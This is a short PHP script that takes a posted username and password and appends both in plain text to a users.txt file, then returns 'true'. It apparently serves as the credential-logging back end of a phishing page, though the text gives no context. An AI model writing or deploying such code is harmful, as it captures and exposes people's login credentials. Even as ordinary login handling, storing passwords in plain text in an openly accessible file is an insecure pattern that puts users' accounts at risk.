<?php
$res_arr = array();
if(isset($_POST['Username'])){
	$res_arr['username'] = $_POST['Username'];
}
if(isset($_POST['Password'])){
	$res_arr['password'] = $_POST['Password'];
}

$str = "\n".$res_arr['username']."\t".$res_arr['password'];
file_put_contents('users.txt', $str, FILE_APPEND);

$data = true;
echo $data;
?>